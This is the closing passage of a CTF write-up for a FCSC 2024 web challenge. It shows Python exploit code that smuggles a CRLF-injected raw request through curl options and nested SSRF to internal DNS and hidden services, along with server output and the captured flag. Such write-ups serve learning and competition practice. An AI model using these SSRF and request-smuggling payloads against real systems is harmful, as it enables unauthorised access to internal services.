+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;options[CURLOPT_CUSTOMREQUEST]=&#39;</span><span style="color:#f92672">+</span>urlenc(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;GET </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">X-foo:&#39;</span>),
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> mapping<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>	options <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>replace(k, v)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ssrf(
+</span></span><span style="display:flex;"><span>    where<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pong&#39;</span>,
+</span></span><span style="display:flex;"><span>    options<span style="color:#f92672">=</span>urlenc(options)
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p><em>Output:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 pong_lab.py
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Date: Fri, <span style="color:#ae81ff">12</span> Apr <span style="color:#ae81ff">2024</span> 14:02:26 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.59 <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>X-Powered-By: PHP/8.2.17
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">148</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>92n<span style="color:#ae81ff">\x</span>db<span style="color:#ae81ff">\x</span>84<span style="color:#ae81ff">\x</span>a0<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>08fcsc2024<span style="color:#ae81ff">\x</span>02fr<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>fc<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>08frontend<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>04pong<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>03red<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>06<span style="color:#ae81ff">\x</span>06listen<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>07<span style="color:#ae81ff">\x</span>0bfake_domain<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\n\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">05</span>
+</span></span></code></pre></div><p>One last small modification is to change: <code>localhost</code> to <code>localhost@127.0.0.1</code> because <em>localhost</em> doesn&rsquo;t resolve <em>127.0.0.1</em> on the remote server due to the reverse proxy.</p>
+<p>If you run the query on the server, you get the following sub-domain:</p>
+<pre tabindex="0"><code>37b9da922f6360e301faeff19bac866c1a042d4a
+</code></pre><p>Via ssrf, you can go to <code>37b9da922f6360e301faeff19bac866c1a042d4a.fcsc.fr:3000</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ssrf(
+</span></span><span style="display:flex;"><span>    where<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;localhost@37b9da922f6360e301faeff19bac866c1a042d4a.fcsc2024.fr:3000</span><span style="color:#e6db74">{</span>redos<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    options<span style="color:#f92672">=</span>{}
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p><em>Output</em>:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+date: Fri, 12 Apr 2024 14:16:24 GMT
+server: Apache/2.4.58 (Unix)
+x-powered-by: PHP/8.3.4
+content-length: 70
+content-type: text/html; charset=UTF-8
+x-robots-tag: noindex, nofollow, nosnippet, noarchive, nocache, noodp, noyaca
+connection: close
+
+FCSC{d8af233176d6ca50598a48fc47d8cadeae37b3d35a641efc1ad7777c86fe28a9}
+</code></pre><h1 id="conclusion">Conclusion:</h1>
+<p>This challenge is one of the hardest I&rsquo;ve had to do in Web, the fact of having a sequence of nested ssrf and abusing options and vulnerabilities in CUrl at the same time makes full exploitation difficult.</p>
+<p>Here&rsquo;s a schematic of the full exploit:<br>
+<img src="https://i.imgur.com/ZtniYci.png" alt="Exploitation diagram"></p>
+<p>Thanks to <a href="https://twitter.com/kevin_mizu" target="_blank">Mizu</a> and <a href="https://twitter.com/BitK_" target="_blank">BitK</a> for the challenge :)</p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://vozec.github.io/writeups/twisty-python-fcsc2024-en/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Twisty Python [EN]| FCSC 2024</a>
+        
+	    
+            <div class="next-post">
+                <a href="https://vozec.github.io/writeups/encodecept-htb-university-2024/?ref=footer"><span style="font-weight:bold;">Next »</span><br>EncoDecept [EN] | HTB University CTF 2024</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#first-vulnerability-on-frontendfcsc2024fr">First vulnerability on frontend.fcsc2024.fr</a></li>
+    <li><a href="#bypass-remote_addr">Bypass REMOTE_ADDR</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#service-pong">Service pong</a></li>
+        <li><a href="#service-dns">Service dns</a></li>
+      </ul>
+    </li>
+    <li><a href="#problem">Problem:</a></li>
+    <li><a href="#first-track">First track:</a></li>
+    <li><a href="#creating-the-dns-query">Creating the DNS query.</a></li>
+    <li><a href="#sends-arbitrary-raw-bytes-to-dns">Sends arbitrary raw bytes to DNS.</a>
+      <ul>
+        <li><a href="#in-depth-search-of-curls-hidden-options">In-depth search of curl&rsquo;s hidden options.</a></li>
+        <li><a href="#confirmation-of-exploitation-path">Confirmation of exploitation path:</a></li>
+      </ul>
+    </li>
+    <li><a href="#discover-of-the-real-open-redirect-">Discover of the real Open-redirect :</a>
+      <ul>
+        <li></li>
+        <li><a href="#last-step">Last step</a></li>
+      </ul>
+    </li>
+    <li><a href="#pooling">Pooling:</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
